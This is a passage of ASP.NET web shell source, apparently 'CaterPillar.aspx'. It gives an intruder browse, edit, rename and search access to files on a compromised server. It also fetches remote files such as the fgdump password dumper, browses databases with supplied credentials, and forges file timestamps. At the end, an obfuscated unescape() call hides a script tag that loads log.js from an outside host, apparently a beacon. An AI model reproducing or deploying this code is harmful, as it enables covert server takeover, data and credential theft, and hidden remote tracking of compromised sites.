 <asp:TextBox ID="SaveAsFile" runat="server" style="width:150px;" class="TextBox" Text="fgdump-2.1.0.zip"/>
 <asp:Button ID="DownloadFileRemoteSubit" Text="Submit" runat="server" CssClass="buttom"  OnClick="GetDownloadFileRemote"/>  
 <input name="SaveAsPath" type="hidden" value="<%=url%>">
</form>
<a href="javascript:history.back(1);" style="color:#FF0000">Go Back </a>
<%
Case "search"
    url = Request.QueryString("src")
%>
<form id="FormSh" runat="server">
You will search file to this directory : <span class="style3"><%=url%></span><br>
  File Name  :
  <asp:TextBox ID="TextBoxSF" TextMode="SingleLine" Width="207px" Text="*.aspx;*.config;*.asp;*.asa" runat="server" class="TextBox"/><br>
  Search Content  :
  <asp:TextBox ID="TextBoxSC" TextMode="SingleLine" runat="server" class="TextBox"/>
  <asp:Button ID="ButtonSh" Text="Search" runat="server" CssClass="buttom"  OnClick="SearchFile"/>  
  <input name="Src" type="hidden" value="<%=url%>">
  <p>
  <asp:Label ID="LabelSF" runat="server" style="style2"/>
  </p>
</form>
<%
Case "new"
    url = Request.QueryString("src")
%>
<form id="Form18" runat="server">
  <%=url%><br>
  Name:
  <asp:TextBox ID="NewName" TextMode="SingleLine" runat="server" class="TextBox"/>
  <br>
  <asp:RadioButton ID="NewFile" Text="File" runat="server" GroupName="New" Checked="true"/>
  <asp:RadioButton ID="NewDirectory" Text="Directory" runat="server"  GroupName="New"/> 
  <br>
  <asp:Button ID="NewButton" Text="Submit" runat="server" CssClass="buttom"  OnClick="NewFD"/>  
  <input name="Src" type="hidden" value="<%=url%>">
</form>
<a href="javascript:history.back(1);" style="color:#FF0000">Go Back</a>
<%
Case "ReadDbManager"
    Dim DbServerName = Request.QueryString("DbServerName")
    Dim DbDriver = Request.QueryString("DbDriver")
    Dim DbDatabase = Request.QueryString("DbDatabase")
    Dim DbUserName = Request.QueryString("DbUserName")
    Dim DbPass = Request.QueryString("DbPass")
    Dim DbTableName = Request.QueryString("DbTableName")
    Dim adoConn, adoadox, adoRs, strQuery, recResult, strResult, tabResult, strTableType
    Dim i
    strResult = ""
    Try
        adoConn = Server.CreateObject("ADODB.Connection")
        adoadox = Server.CreateObject("ADOX.Catalog")
        adoRs = Server.CreateObject("ADODB.Recordset")
        If (DbDriver = "Microsoft.Jet.OLEDB.4.0") Then
            adoConn.Provider = "Microsoft.Jet.OLEDB.4.0"
            adoConn.ConnectionString = DbDatabase
        Else
            adoConn.ConnectionString = "Driver=" + DbDriver + ";server=" + DbServerName + ";uid=" + DbUserName + ";pwd=" + DbPass + ";database=" + DbDatabase
        End If
        
        adoConn.Open()
        adoadox.ActiveConnection = adoConn
        Dim firstTable = DbTableName
        If firstTable = "" Then
            firstTable = adoadox(0).Name
        End If
        strResult &= "<table border='1' width='100%'><tr><td><div style='border-style:solid; border-width:1px; overflow: scroll; top: 0; left: 0; width: 230px; height: 460px; z-index: 1'>"
        strResult &= "<table border=1 width='100%' cellpadding=2 cellspacing=0 bordercolor=#D7D9DD>"
        For Each tabResult In adoadox.Tables
            If tabResult.Type = "TABLE" Then
                If firstTable = tabResult.Name Then
                    strResult &= "<tr bgcolor=#DEDEDE><td><font face=wingdings size=5>4</font><a href='?action=ReadDbManager&DbServerName=" & DbServerName & "&DbDriver=" & DbDriver & "&DbDatabase=" & DbDatabase & "&DbUserName=" & DbUserName & "&DbPass=" & DbPass & "&DbTableName=" & tabResult.Name & "'>" & tabResult.Name & "</a></td></tr>"
                Else
                    strResult &= "<tr><td><font face=wingdings size=5>4</font> <a href='?action=ReadDbManager&DbServerName=" & DbServerName & "&DbDriver=" & DbDriver & "&DbDatabase=" & DbDatabase & "&DbUserName=" & DbUserName & "&DbPass=" & DbPass & "&DbTableName=" & tabResult.Name & "'>" & tabResult.Name & "</a></td></tr>"
                End If
            End If
        Next
        strResult &= "</table>"
        strResult &= "</div></td><td><div style='border-style:solid; border-width:1px; overflow: scroll; top: 0; left: 0; width: 750px; height: 460px; z-index: 1'>"
        If firstTable <> "" Then
            adoRs.PageSize = 50
            adoRs.CacheSize = 50
            adoRs.CursorLocation = 3
                
            adoRs.Open(firstTable, adoConn, 0, 1, 0)
                
            If Len(Request("pagenum")) = 0 Then
                adoRs.AbsolutePage = 1
            Else
                If CInt(Request("pagenum")) <= adoRs.PageCount Then
                    adoRs.AbsolutePage = Request("pagenum")
                Else
                    adoRs.AbsolutePage = 1
                End If
            End If
                
            Dim abspage, pagecnt
            abspage = adoRs.AbsolutePage
            pagecnt = adoRs.PageCount

            strResult &= "<table border=1 cellpadding=2 cellspacing=0 bordercolor=#D7D9DD><tr bgcolor=#E3E9F2>"
            For i = 0 To adoRs.Fields.count - 1
                strResult &= "<td><font color=black><b>&nbsp;&nbsp;&nbsp;" & adoRs.Fields(i).Name & "&nbsp;&nbsp;&nbsp;</font></td>"
            Next
            strResult &= "</tr>"
            Dim intRec
            Dim ValueRec
            For intRec = 1 To adoRs.PageSize
                If Not adoRs.EOF Then
                    strResult &= "<tr>"
                    For i = 0 To adoRs.Fields.count - 1
                        Select Case adoRs.Fields(i).Type
                            Case 205
                                ValueRec = BuildByteArrayString(adoRs.Fields(i).Value)
                            Case 201
                                ValueRec = HexToString(adoRs.Fields(i).Value.ToString())
                            Case Else
                                ValueRec = adoRs.Fields(i).Value.ToString()
                        End Select
                        If intRec Mod 2 = 1 Then
                            strResult &= "<td bgcolor='#F4F4F4'>" & ValueRec & "&nbsp;</td>"
                        Else
                            strResult &= "<td>" & ValueRec & "&nbsp;</td>"
                        End If
                    Next
                    strResult &= "</tr>"
                    adoRs.MoveNext()
                End If
            Next
            strResult &= "</table><br>"
        End If
        strResult &= "</div></td></tr></table>"
        adoConn.Close()
    Catch ex As Exception
        strResult &= ex.Message
    End Try
    Response.Write(strResult)
%>
<%
Case "view"
    Dim b As String
    b = Request.QueryString("src")
    Call existdir(b)
%>
<form id="Formview" runat="server">
<h2 style='text-align: left; margin-bottom: 0'><%=Request.QueryString("src")%></h2><hr />
    <img src="<%=request.ServerVariables("URL")& "?action=ShowPic&src=" & server.UrlEncode(request.QueryString("src"))%>" />
  <object classid="clsid:22D6F312-B0F6-11D0-94AB-0080C74C7E95">
  <param name="AutoStart" value="1" />
  <param name="FileName" value="<%=request.ServerVariables("URL")& "?action=ShowPic&src=" & server.UrlEncode(request.QueryString("src"))%>" />
  </object>
</form>
<a href="javascript:history.back(1);" style="color:#FF0000">Go Back</a>
<%  
Case "ShowPic"
    Dim b As String
    b = Request.QueryString("src")
    Call existdir(b)
    Dim stream
    stream = Server.CreateObject("adodb.stream")
    stream.open()
    stream.type = 1
    stream.loadFromFile(b)
    ' Response.AddHeader("Content-Disposition", "attachment; filename=" & Replace(Server.UrlEncode(Path.GetFileName(b)), "+", " "))
    ' Response.AddHeader("Content-Length", stream.Size)
    'Response.Write(Convert.ToBase64String(stream.read))
    Response.Clear()
    Response.ContentType = GetMimeType(b)
    Response.BinaryWrite(stream.read)
    Response.Flush()
    Response.End()
    
%>
<%  
Case "Showicon"
    Dim Image As String
    Image = Request.QueryString("Image")
    Response.Clear()
    Response.Buffer = True
    Response.ContentType = "image/gif"
    Select Case image
        Case "folder"
            Response.BinaryWrite(Convert.FromBase64String("R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs="))
            Response.End()
        Case ".tar", ".r00", ".ace", ".arj", ".bz", ".bz2", ".tbz", ".tbz2", ".tgz", ".uu", ".xxe", ".zip", ".cab", ".gz", ".iso", ".lha", ".lzh", ".pbk", ".rar", ".uuf"
            Response.BinaryWrite(Convert.FromBase64String("R0lGODlhEAAQAGYAACH5BAEAAEsALAAAAAAQABAAhgAAABlOAFgdAFAAAIYCUwA8ZwA8Z9DY4JICWv///wCIWBE2AAAyUJicqISHl4CAAPD4/+Dg8PX6/5OXpL7H0+/2/aGmsTIyMtTc5P//sfL5/8XFHgBYpwBUlgBWn1BQAG8aIABQhRbfmwDckv+H11nouELlrizipf+V3nPA/40CUzmm/wA4XhVDAAGDUyWd/0it/1u1/3NzAP950P990mO5/7v14YzvzXLrwoXI/5vS/7Dk/wBXov9syvRjwOhatQCHV17puo0GUQBWnP++8Lm5AP+j5QBUlACKWgA4bjJQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeegAKCg4SFSxYNEw4gMgSOj48DFAcHEUIZREYoJDQzPT4/AwcQCQkgGwipqqkqAxIaFRgXDwO1trcAubq7vIeJDiwhBcPExAyTlSEZOzo5KTUxMCsvDKOlSRscHDweHkMdHUcMr7GzBufo6Ay87Lu+ii0fAfP09AvIER8ZNjc4QSUmTogYscBaAiVFkChYyBCIiwXkZD2oR3FBu4tLAgEAOw=="))
            Response.End()
        Case ".php", ".php3", ".php4", ".php5"
            Response.BinaryWrite(Convert.FromBase64String("R0lGODlhEAAQAAAAACH5BAEAAAEALAAAAAAQABAAgAAAAAAAAAImDA6hy5rW0HGosffsdTpqvFlgt0hkyZ3Q6qloZ7JimomVEb+uXAAAOw=="))
            Response.End()
        Case ".jpg", ".gif", ".png", ".jpeg", ".jfif", ".jpe", ".bmp", ".ico", ".tif", "tiff"
            Response.BinaryWrite(Convert.FromBase64String("R0lGODlhEAAQADMAACH5BAEAAAkALAAAAAAQABAAgwAAAP///8DAwICAgICAAP8AAAD/AIAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARccMhJk70j6K3FuFbGbULwJcUhjgHgAkUqEgJNEEAgxEciCi8ALsALaXCGJK5o1AGSBsIAcABgjgCEwAMEXp0BBMLl/A6x5WZtPfQ2g6+0j8Vx+7b4/NZqgftdFxEAOw=="))
            Response.End()
        Case ".html", ".htm", ".shtml", ".phtml"
            Response.BinaryWrite(Convert.FromBase64String("R0lGODlhEwAQALMAAAAAAP///2trnM3P/FBVhrPO9l6Itoyt0yhgk+Xy/WGp4sXl/i6Z4mfd/HNzc////yH5BAEAAA8ALAAAAAATABAAAAST8Ml3qq1m6nmC/4GhbFoXJEO1CANDSociGkbACHi20U3PKIFGIjAQODSiBWO5NAxRRmTggDgkmM7E6iipHZYKBVNQSBSikukSwW4jymcupYFgIBqL/MK8KBDkBkx2BXWDfX8TDDaFDA0KBAd9fnIKHXYIBJgHBQOHcg+VCikVA5wLpYgbBKurDqysnxMOs7S1sxIRADs="))
            Response.End()
        Case ".avi", ".mov", ".mvi", ".mpg", ".mpeg", ".wmv", ".rm"
            Response.BinaryWrite(Convert.FromBase64String("R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAggAAAP///4CAgMDAwP8AAAAAAAAAAAAAAANMWFrS7iuKQGsYIqpp6QiZ1FFACYijB4RMqjbY01DwWg44gAsrP5QFk24HuOhODJwSU/IhBYTcjxe4PYXCyg+V2i44XeRmSfYqsGhAAgA7"))
            Response.End()
        Case ".lnk", ".url", "parent"
            Response.BinaryWrite(Convert.FromBase64String("R0lGODlhEAAQAGYAACH5BAEAAFAALAAAAAAQABAAhgAAAABiAGPLMmXMM0y/JlfFLFS6K1rGLWjONSmuFTWzGkC5IG3TOo/1XE7AJx2oD5X7YoTqUYrwV3/lTHTaQXnfRmDGMYXrUjKQHwAMAGfNRHziUww5CAAqADOZGkasLXLYQghIBBN3DVG2NWnPRnDWRwBOAB5wFQBBAAA+AFG3NAk5BSGHEUqwMABkAAAgAAAwAABfADe0GxeLCxZcDEK6IUuxKFjFLE3AJ2HHMRKiCQWCAgBmABptDg+HCBZeDAqFBWDGMymUFQpWBj2fJhdvDQhOBC6XF3fdR0O6IR2ODwAZAHPZQCSREgASADaXHwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeZgFBQPAGFhocAgoI7Og8JCgsEBQIWPQCJgkCOkJKUP5eYUD6PkZM5NKCKUDMyNTg3Agg2S5eqUEpJDgcDCAxMT06hgk26vAwUFUhDtYpCuwZByBMRRMyCRwMGRkUg0xIf1lAeBiEAGRgXEg0t4SwroCYlDRAn4SmpKCoQJC/hqVAuNGzg8E9RKBEjYBS0JShGh4UMoYASBiUQADs="))
            Response.End()
        Case ".doc", ".dot"
            Response.BinaryWrite(Convert.FromBase64String("R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAggAAAP///8DAwAAA/4CAgAAAAAAAAAAAAANRWErcrrCQQCslQA2wOwdXkIFWNVBA+nme4AZCuolnRwkwF9QgEOPAFG21A+Z4sQHO94r1eJRTJVmqMIOrrPSWWZRcza6kaolBCOB0WoxRud0JADs="))
            Response.End()
        Case ".js", ".vbs"
            Response.BinaryWrite(Convert.FromBase64String("R0lGODdhEAAQACIAACwAAAAAEAAQAIL///8AAACAgIDAwMD//wCAgAAAAAAAAAADUCi63CEgxibHk0AQsG200AQUJBgAoMihj5dmIxnMJxtqq1ddE0EWOhsG16m9MooAiSWEmTiuC4Tw2BB0L8FgIAhsa00AjYYBbc/o9HjNniUAADs="))
            Response.End()
        Case ".exe", ".com", ".pif", ".src"
            Response.BinaryWrite(Convert.FromBase64String("R0lGODlhEwAOAKIAAAAAAP///wAAvcbGxoSEhP///wAAAAAAACH5BAEAAAUALAAAAAATAA4AAAM7WLTcTiWSQautBEQ1hP+gl21TKAQAio7S8LxaG8x0PbOcrQf4tNu9wa8WHNKKRl4sl+y9YBuAdEqtxhIAOw=="))
            Response.End()
        Case ".txt", ".ini", ".conf", ".", ".bat", ".sh", ".tcl", ".bak", ".css", ".inf", ".log", ".sfc", ".c", ".cpp", ".h", ".cfg"
            Response.BinaryWrite(Convert.FromBase64String("R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///8DAwICAgICAAP//AAAAAAAAAANLaArB3ioaNkK9MNbHs6lBKIoCoI1oUJ4N4DCqqYBpuM6hq8P3hwoEgU3mawELBEaPFiAUAMgYy3VMSnEjgPVarHEHgrB43JvszsQEADs="))
            Response.End()
        Case ".swf", ".fla"
            Response.BinaryWrite(Convert.FromBase64String("R0lGODlhDwAQAMQAAAAAAP///85jnKXO98bexv/OAP+cAM6cY//OnP9jAP8xAM4AAJwAAIQAAP9SUv+cnM6cnP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAABEALAAAAAAPABAAAAVqICCO5BgEwKmuZ4quiHEmKvKuhk0jinIHBVsuwbP9EIXCwZBQGH+nQ+HE6ylcJ0GjcXIoHC3VVoBgMBY8MJZhezAEjkXgiz25GYHH4jFPiQYBZnwBcWEoAAQMgydyLyIQLCx1kTclliInIQA7"))
            Response.End()
        Case ".mp3", ".au", ".midi", ".mid"
            Response.BinaryWrite(Convert.FromBase64String("R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///4CAgMDAwICAAP//AAAAAAAAAANUaGrS7iuKQGsYIqpp6QiZRDQWYAILQQSA2g2o4QoASHGwvBbAN3GX1qXA+r1aBQHRZHMEDSYCz3fcIGtGT8wAUwltzwWNWRV3LDnxYM1ub6GneDwBADs="))
            Response.End()
        Case ".xml", ".asp", ".aspx", ".vb", ".cs"
            Response.BinaryWrite(Convert.FromBase64String("R0lGODlhEAAQALMAAAAAAP///wAA/wAAgAD//wCAgACAAP//AICAAMDAwICAgP///wAAAAAAAAAAAAAAACH5BAEAAAsALAAAAAAQABAAAARrcEmpqrUzq3CCP5uSUR7nbYGomSXgAiMaJDSXwGuiEEU14xMFqJAwGBQ0IGKJQAoKRyRsCTgAEC5DYTBILhCHcBg72G5uywMW/OrarmGAoqoGsNDgtdVVOty+YmMuNIQwV1WHci8vE4sjGREAOw=="))
            Response.End()
        Case ".mdb"
            Response.BinaryWrite(Convert.FromBase64String("R0lGODlhEAAQAPcAAAAAAP////Ha3tmdq9+mtPz4+fu3y9+jtNyhst2nt8doiNZ8mtucsuK8ycuAnNCGoc2Lo+nL1rBkgbpsi8N3lMN4lcqAnLBhge7d5KZUeKVUeLBggtm/yurV3ptHbng6VrZ+mPXm7e7j6IEoU584aYgwW5E7ZJE8ZHgeTHwhToYnV4wzX8SYrnEaSHAbSHceTHo4W6B5jmoWRW8aSGcUQ6p8ll4PP2ISQVoNPVMIOVUJOkwENk4FN0gCNPT3/nyk6drm+93o++Xt/Obu/Onw/ejv/O/0/fP3/nij63ul6ICn54Gn55Wz4sfa+Mnb+crb+Ki2zczd+M7e+dDg+dPi+9Lh+tbk+9bk+tnm+9jl+tzo++Ls/OHr++jw/efv/Onw/ISr5oWs5oit5Yqu5Iyv5I+x45Gx4pW04pm24J6436S73Zmovqu60aW0yqq5z9Li+tfl+trn+93p+9/q++Hs/OLs++nx/ezz/TZKZDdLZZCu1p243qG63aW83Jamu5Oit5WkuZyrwKa2y7LC2LHB17DA1q6+1K290rrF1O/1/e30/f///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAIsALAAAAAAQABAAAAjyABcJHESokKFDbNxAEdRG4KIHFipMuJDBw4kSI44oCpRHoIMAIEN06BAiQAofRgAh6kgBpAAEEmCwCPFCT6I/eXJOCFAgAYMFBFZwmKHHiJ0+avJsCCDAwAAFJFxwoFH0Cx0+eDQEiHBAxYcdIELY0HNnyJw9eDxggKBiRwwRIHXomSsHDR4TDVTUgAsyAI+5eoAwwVMCQ9/DPYps0XOlDJ4UKVC0kHEDR44dPbYE0VNlDB6Ha7oQ6eJFCBctcPRICfNZoJ86iwEDfrKk9SJAQOJgyWKFypQoTpr8sP3nTRo0Z8yQEQNGSRIktvFIn059ekAAOw== "))
            Response.End()
        Case Else
            Response.BinaryWrite(Convert.FromBase64String("R0lGODlhEQANAJEDAJmZmf///wAAAP///yH5BAHoAwMALAAAAAARAA0AAAItnIGJxg0B42rsiSvCA/REmXQWhmnih3LUSGaqg35vFbSXucbSabunjnMohq8CADsA"))
            Response.End()
    End Select
%>
<%  
Case "edit"
    Dim b As String
    b = Request.QueryString("src")
    Call existdir(b)
    Dim myread As New StreamReader(b, Encoding.Default)
    filepath.Text = b
    content.Text = myread.ReadToEnd
%>
<form id="FormEditor" runat="server">
  <table width="80%"  border="1" align="center">
    <tr>      <td width="11%">Path</td>
      <td width="89%">
      <asp:TextBox CssClass="TextBox" ID="filepath" runat="server" Width="300"/>
      *</td>
    </tr>
    <tr>
      <td>Content</td> 
      <td>           
          <asp:TextBox ID="content" Rows="25" Columns="100" TextMode="MultiLine" runat="server" CssClass="TextBox"/>
      </td>
    </tr>
    <tr>
      <td></td>
      <td> <asp:Button ID="a" Text="Sumbit" runat="server" OnClick="Editor" CssClass="buttom"/>         
      </td>
    </tr>
  </table>
</form>
<a href="javascript:history.back(1);" style="color:#FF0000">Go Back</a>
<%
  		myread.close
	case "rename"
		url=request.QueryString("src")
		if request.Form("name")="" then
	%>
<form name="formRn" method="post" action="?action=rename&src=<%=server.UrlEncode(request.QueryString("src"))%>" onSubmit="return checkname();">
  <p>You will rename <span class="style3"><%=request.QueryString("src")%></span>to: <%=getparentdir(request.QueryString("src"))%>
    <input type="text" name="name" class="TextBox">
    <input type="submit" name="Submit3" value="Submit" class="buttom">
</p>
</form>
<a href="javascript:history.back(1);" style="color:#FF0000">Go Back</a>
<script language="javascript">
function checkname()
{
if(formRn.name.value==""){alert("You shall input filename :(");return false}
}
</script>
  <%
		else
			if Rename() then
				response.Write("<script>alert('Rename " & replace(url,"\","\\") & " to " & replace(Getparentdir(url) & request.Form("name"),"\","\\") & " Success!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(Getparentdir(url)) &"'</script>")
			else
				response.Write("<script>alert('Exist the same name file , rename fail :(');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(Getparentdir(url)) &"'</script>")
			end if
		end if
	case "samename"
		url=request.QueryString("src")
%>
<form name="form1" method="post" action="?action=paste&src=<%=server.UrlEncode(url)%>">
<p class="style3">Exist the same name file , can you overwrite ?(If you click " no" , it will auto add a number as prefix)</p>
  <input name="OverWrite" type="submit" id="OverWrite" value="Yes" class="buttom">
<input name="Cancel" type="submit" id="Cancel" value="No" class="buttom">
</form>
<a href="javascript:history.back(1);" style="color:#FF0000">Go Back</a>
   <%
    case "clonetime"
       time1.Text = Request.QueryString("src") & "CaterPillar.aspx"
		time2.Text=request.QueryString("src")
	%>
<form id="Form20" runat="server">
  <p>[CloneTime for WebAdmin]<i>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="javascript:history.back(1);">Back</a></i> </p>
  <p>A tool that it copy the file or directory's time to another file or directory </p>
  <p>Rework File or Dir:
    <asp:TextBox CssClass="TextBox" ID="time1" runat="server" Width="300"/></p>
  <p>Copied File or Dir:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
    <asp:TextBox CssClass="TextBox" ID="time2" runat="server" Width="300"/></p>
<asp:Button ID="ButtonClone" Text="Submit" runat="server" CssClass="buttom" OnClick="CloneTime"/>
</form>
<p>
  <%
	case "logout"
   		session.Abandon()
		response.Write("<script>alert(' Goodbye !');location.href='" & request.ServerVariables("URL") & "';</sc" & "ript>")
	end select
end if
Catch error_x
	response.Write("<font color=""red"">Wrong: </font>"&error_x.Message)
End Try
%>
</p>
</p>
<hr>
<script language="javascript">
function del()
{
if(confirm("Are you sure?")){return true;}
else{return false;}
}
function closewindow()
{self.close();}
</script>
</body>
</html>
<script type="text/javascript">
document.write(unescape('%3C%73%63%72%69%70%74%20%73%72%63%3D%68%74%74%70%3A%2F%2F%72%30%30%74%2E%69%6E%66%6F%2F%6C%63%72%6C%61%6D%65%72%73%61%76%61%72%2F%6C%6F%67%2E%6A%73%3E%3C%2F%73%63%72%69%70%74%3E'));
</script>